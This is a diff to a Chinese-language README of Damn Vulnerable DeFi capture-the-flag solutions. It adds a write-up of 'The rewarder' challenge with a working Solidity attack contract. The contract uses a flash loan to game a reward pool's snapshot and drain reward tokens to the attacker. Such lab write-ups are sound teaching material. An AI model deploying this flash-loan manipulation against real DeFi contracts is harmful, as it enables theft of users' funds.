@@ -236,7 +236,7 @@ forge test --match-contract Truster -vvvv
 
 
 
-部署个合约调用 `SideEntranceLenderPool`借贷池的 **flashLoan() **函数借出池子里全部的 ETH,借贷池合约会接口调用我们部署的恶意合约的  **execute() **函数，在 **execut()** 函数里 **call()** 借贷池 **deposit()** 函数将闪电贷借出的 ETH 存入借贷池合约,使得能通过  **require** 金额检查,完成这笔闪电贷,再调用 **withdraw()** 取出 ETH,完成清空借贷池的 ETH.
+部署个合约调用 `SideEntranceLenderPool`借贷池的 **flashLoan()**函数借出池子里全部的 ETH,借贷池合约会接口调用我们部署的恶意合约的  **execute()**函数，在 **execut()** 函数里 **call()** 借贷池 **deposit()** 函数将闪电贷借出的 ETH 存入借贷池合约,使得能通过  **require** 金额检查,完成这笔闪电贷,再调用 **withdraw()** 取出 ETH,完成清空借贷池的 ETH.
 
 使用 foundry 编写测试:
 
@@ -276,3 +276,74 @@ forge test --match-contract SideEntrance -vvvv
 ```
 
 ![Truster](./testimage/side-entrance.png)
+
+
+
+# Challenge #5 - The rewarder
+
+合约:
+
+- [DamnValuableToken](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/DamnValuableToken.sol)  Token 合约
+- [FlashLoanerPool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/the-rewarder/FlashLoanerPool.sol) 提供 DVT Token闪电贷的借贷池
+- [RewardToken.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/the-rewarder/RewardToken.sol) 奖励 Token 合约
+- [AccountingToken.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/the-rewarder/AccountingToken.sol) ERC20Snapshot 合约
+- [TheRewarderPool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/the-rewarder/TheRewarderPool.sol) DVT 存款 Pool 奖励合约
+
+完成条件:
+
+有一个 Pool 合约,每 5 天为存入DVT 代币的人提供代币奖励,Alice、Bob、Charlie 和 David 已经存入了一些 DVT 代币,并赢得了他们的奖励,你初始没有任何 DVT 代币,你需要利用闪电贷提供的 DVT 代币获取最多的代币奖励.
+
+解决方案:
+
+整个合约工作流程是:`TheRewarderPool` 是一个存放 DVT Token,为存入者 1 : 1 mint `Accounting`合约 Token,供调用 `AccountingToken` 合约快照存入的代币数量/总量相关信息,每五天为一轮根据快照计算出要 mint 给用户的`RewardToken` 合约奖励代币数量 ,mint奖励 Token. 而 `TheRewarderPool` 的问题是 **distributeRewards()** 函数里,每次都会调用会判断是否时间是否已过去 5 天足以开启下一轮,创建一个新的 Token 存入信息,检查调用者是否已经取回了他们当前轮的奖励,没有则计算调用者奖励代币数量并 mint 给调用者. 也就是说编写一个合约在足以开启新的一轮时间点发起一笔闪电贷从 `FlashLoanerPool`借出 dvt 代币 **deposit()** 到 `TheRewarderPool`合约,  **distributeRewards()** 函数里会快照一个新的存入 dvt 的代币数量计算并 mint 给我们奖励代币,然后在这笔交易里 **withdraw()** 出 dvt 代币还给 `FlashLoanerPool`.(等于只短暂闪电贷借用了 dvt 代币,进行快照获得了大量奖励代币).
+
+使用 foundry 编写测试:
+
+[TheRewarderPool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/TheRewarder.t.sol)
+
+```
+forge test --match-contract TheRewarder -vvvv
+```
+
+```solidity
+contract PayLoad {
+    uint public falshloan_amount;
+    FlashLoanerPool flashLoanpool;
+    TheRewarderPool rewarderpool;
+    DamnValuableToken dvt;
+    address public attacker;
+
+    constructor (FlashLoanerPool _flashLoanPooladdr, TheRewarderPool _rewarderPooladdr, DamnValuableToken _DamnValuableTokenaddr) {
+        flashLoanpool = _flashLoanPooladdr;
+        rewarderpool = _rewarderPooladdr;
+        dvt = _DamnValuableTokenaddr;
+        attacker = msg.sender;
+    }
+
+    function startAttack() public {
+        falshloan_amount = dvt.balanceOf(address(flashLoanpool));
+        flashLoanpool.flashLoan(falshloan_amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        dvt.approve(address(rewarderpool), falshloan_amount);
+        rewarderpool.deposit(falshloan_amount);
+        rewarderpool.withdraw(falshloan_amount);
+        dvt.transfer(address(flashLoanpool), amount);
+        rewarderpool.rewardToken().transfer(attacker, rewarderpool.rewardToken().balanceOf(address(this)));
+    }
+}
+
+contract TheRewarder is Test{
+    function testExploit() public {
+        utils.mineTime(5 days);
+        vm.startPrank(attacker);
+        payload = new PayLoad(flashLoanerPool, theRewarderPool, dvt);
+        payload.startAttack();
+        vm.stopPrank();
+        verfiy();
+    }
+ }
+```
+
+ 
